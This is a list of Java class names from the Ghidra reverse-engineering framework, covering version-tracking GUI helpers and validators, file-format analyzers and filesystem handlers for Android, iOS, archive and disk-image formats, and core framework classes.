ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToAddressTableRowMapper$VTMarkupItemSourceWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToAddressTableRowMapper$VTMarkupItemSourceWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToProgramLocationTableRowMapper
ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToProgramLocationTableRowMapper$VTMarkupItemSourceWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToProgramLocationTableRowMapper$VTMarkupItemSourceWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToAddressTableRowMapper
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToAddressTableRowMapper$VTMatchDestinationWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToAddressTableRowMapper$VTMatchDestinationWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToProgramLocationTableRowMapper
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToProgramLocationTableRowMapper$VTMatchDestinationWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMatchDestinationAddressToProgramLocationTableRowMapper$VTMatchDestinationWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMatchSourceAddressToAddressTableRowMapper
ghidra.feature.vt.gui.util.VTMatchSourceAddressToAddressTableRowMapper$VTMatchSourceWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMatchSourceAddressToAddressTableRowMapper$VTMatchSourceWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMatchSourceAddressToProgramLocationTableRowMapper
ghidra.feature.vt.gui.util.VTMatchSourceAddressToProgramLocationTableRowMapper$VTMatchSourceWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMatchSourceAddressToProgramLocationTableRowMapper$VTMatchSourceWrappedMappedTableColumn
ghidra.feature.vt.gui.validator.MemoryBlocksValidator
ghidra.feature.vt.gui.validator.NoReturnsFunctionsValidator
ghidra.feature.vt.gui.validator.NumberOfFunctionsValidator
ghidra.feature.vt.gui.validator.OffcutReferencesVTPreconditionValidator
ghidra.feature.vt.gui.validator.PercentAnalyzedVTPreconditionValidator
ghidra.feature.vt.gui.validator.RedFlagsVTPreconditionValidator
ghidra.feature.vt.gui.validator.VTPostAnalysisPreconditionValidatorAdaptor
ghidra.feature.vt.gui.validator.VTPreconditionValidator
ghidra.file.analyzers.FileFormatAnalyzer
ghidra.file.crypto.Decryptor
ghidra.file.formats.android.apk.ApkFileSystem
ghidra.file.formats.android.bootimg.BootImageAnalyzer
ghidra.file.formats.android.bootimg.BootImageFileSystem
ghidra.file.formats.android.dex.DexToJarFileSystem
ghidra.file.formats.android.dex.DexToSmaliFileSystem
ghidra.file.formats.android.dex.analyzer.DexCondenseFillerBytesAnalyzer
ghidra.file.formats.android.dex.analyzer.DexExceptionHandlersAnalyzer
ghidra.file.formats.android.dex.analyzer.DexHeaderFormatAnalyzer
ghidra.file.formats.android.dex.analyzer.DexMarkupDataAnalyzer
ghidra.file.formats.android.dex.analyzer.DexMarkupInstructionsAnalyzer
ghidra.file.formats.android.dex.analyzer.DexMarkupSwitchTableAnalyzer
ghidra.file.formats.android.kernel.KernelFileSystem
ghidra.file.formats.android.odex.OdexFileSystem
ghidra.file.formats.android.odex.OdexHeaderFormatAnalyzer
ghidra.file.formats.android.xml.AndroidXmlFileSystem
ghidra.file.formats.bplist.BinaryPropertyListAnalyzer
ghidra.file.formats.coff.CoffArchiveFileSystem
ghidra.file.formats.complzss.CompLzssFileSystem
ghidra.file.formats.cpio.CpioFileSystem
ghidra.file.formats.ext4.Ext4Analyzer
ghidra.file.formats.ext4.Ext4FileSystem
ghidra.file.formats.ext4.NewExt4Analyzer
ghidra.file.formats.gzip.GZipFileSystem
ghidra.file.formats.ios.apple8900.Apple8900Analyzer
ghidra.file.formats.ios.apple8900.Apple8900Decryptor
ghidra.file.formats.ios.apple8900.Apple8900FileSystem
ghidra.file.formats.ios.dmg.DmgAnalyzer
ghidra.file.formats.ios.dmg.DmgClientFileSystem
ghidra.file.formats.ios.dyldcache.DyldCacheAnalyzer
ghidra.file.formats.ios.dyldcache.DyldCacheFileSystem
ghidra.file.formats.ios.generic.iOS_Analyzer
ghidra.file.formats.ios.generic.iOS_FixupArmSymbolsAnalyzer
ghidra.file.formats.ios.generic.iOS_KextStubFixupAnalyzer
ghidra.file.formats.ios.ibootim.iBootImAnalyzer
ghidra.file.formats.ios.ibootim.iBootImFileSystem
ghidra.file.formats.ios.img2.Img2Analyzer
ghidra.file.formats.ios.img2.Img2FileSystem
ghidra.file.formats.ios.img3.Img3Analyzer
ghidra.file.formats.ios.img3.Img3FileSystem
ghidra.file.formats.ios.img4.Img4FileSystem
ghidra.file.formats.ios.ipsw.IpswFileSystem
ghidra.file.formats.ios.png.CrushedPNGFileSystem
ghidra.file.formats.ios.prelink.PrelinkFileSystem
ghidra.file.formats.iso9660.ISO9660Analyzer
ghidra.file.formats.iso9660.ISO9660FileSystem
ghidra.file.formats.java.JavaClassDecompilerFileSystem
ghidra.file.formats.lzss.LzssAnalyzer
ghidra.file.formats.omf.OmfArchiveFileSystem
ghidra.file.formats.sevenzip.SevenZipFileSystem
ghidra.file.formats.sparseimage.SparseImageFileSystem
ghidra.file.formats.tar.TarFileSystem
ghidra.file.formats.ubi.UniversalBinaryFileSystem
ghidra.file.formats.yaffs2.YAFFS2Analyzer
ghidra.file.formats.yaffs2.YAFFS2FileSystem
ghidra.file.formats.zip.ZipFileSystem
ghidra.formats.gfilesystem.FileSystemEventListener
ghidra.formats.gfilesystem.GFileSystem
ghidra.formats.gfilesystem.GFileSystemBase
ghidra.formats.gfilesystem.GFileSystemProgramProvider
ghidra.formats.gfilesystem.GIconProvider
ghidra.formats.gfilesystem.LocalFileSystem
ghidra.formats.gfilesystem.annotations.FileSystemInfo
ghidra.framework.Application
ghidra.framework.ApplicationConfiguration
ghidra.framework.ApplicationProperties
